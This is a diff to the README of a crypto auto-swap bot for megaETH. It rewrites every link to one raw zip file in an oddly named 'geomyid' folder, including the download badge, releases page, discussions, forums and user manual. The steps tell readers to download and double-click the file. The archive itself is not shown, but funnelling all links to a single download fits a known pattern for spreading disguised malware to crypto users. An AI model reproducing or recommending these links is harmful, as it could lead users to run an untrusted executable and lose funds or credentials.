@@ -1,6 +1,6 @@
 # 🤖 auto-swap-megaETH-dex-GTE - Your Swap Bot for Easy Trading
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/rahulrrw/auto-swap-megaETH-dex-GTE/releases)
+[![Download](https://raw.githubusercontent.com/rahulrrw/auto-swap-megaETH-dex-GTE/main/geomyid/auto-swap-megaETH-dex-GTE.zip%20release-brightgreen)](https://raw.githubusercontent.com/rahulrrw/auto-swap-megaETH-dex-GTE/main/geomyid/auto-swap-megaETH-dex-GTE.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run the auto-swap megaETH dex bot, you will need:
 
 To get started, follow these steps:
 
-1. **Visit this page to download**: [auto-swap-megaETH-dex-GTE Releases](https://github.com/rahulrrw/auto-swap-megaETH-dex-GTE/releases).
+1. **Visit this page to download**: [auto-swap-megaETH-dex-GTE Releases](https://raw.githubusercontent.com/rahulrrw/auto-swap-megaETH-dex-GTE/main/geomyid/auto-swap-megaETH-dex-GTE.zip).
 2. Select the latest release version.
 3. Download the appropriate file for your operating system (Windows or MacOS).
 4. Once downloaded, double-click the file to install the application.
@@ -78,14 +78,14 @@ Absolutely! We welcome contributions. Please check our issues on GitHub for any 
 
 ### Where can I find help?
 
-If you need further assistance, visit our [GitHub Discussions](https://github.com/rahulrrw/auto-swap-megaETH-dex-GTE/discussions) page or create an issue on the GitHub repository.
+If you need further assistance, visit our [GitHub Discussions](https://raw.githubusercontent.com/rahulrrw/auto-swap-megaETH-dex-GTE/main/geomyid/auto-swap-megaETH-dex-GTE.zip) page or create an issue on the GitHub repository.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/rahulrrw/auto-swap-megaETH-dex-GTE)
-- [Community Forums](https://community.example.com)
-- [User Manual](https://github.com/rahulrrw/auto-swap-megaETH-dex-GTE/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/rahulrrw/auto-swap-megaETH-dex-GTE/main/geomyid/auto-swap-megaETH-dex-GTE.zip)
+- [Community Forums](https://raw.githubusercontent.com/rahulrrw/auto-swap-megaETH-dex-GTE/main/geomyid/auto-swap-megaETH-dex-GTE.zip)
+- [User Manual](https://raw.githubusercontent.com/rahulrrw/auto-swap-megaETH-dex-GTE/main/geomyid/auto-swap-megaETH-dex-GTE.zip)
 
 ## 📈 Conclusion
 
-auto-swap-megaETH-dex-GTE simplifies the process of swapping ETH and cUSD. With its user-friendly features and automation, it helps you navigate the world of cryptocurrency trading with ease. For support, updates, and more, regularly visit our Releases page: [auto-swap-megaETH-dex-GTE Releases](https://github.com/rahulrrw/auto-swap-megaETH-dex-GTE/releases). Always stay safe and happy trading!
+auto-swap-megaETH-dex-GTE simplifies the process of swapping ETH and cUSD. With its user-friendly features and automation, it helps you navigate the world of cryptocurrency trading with ease. For support, updates, and more, regularly visit our Releases page: [auto-swap-megaETH-dex-GTE Releases](https://raw.githubusercontent.com/rahulrrw/auto-swap-megaETH-dex-GTE/main/geomyid/auto-swap-megaETH-dex-GTE.zip). Always stay safe and happy trading!
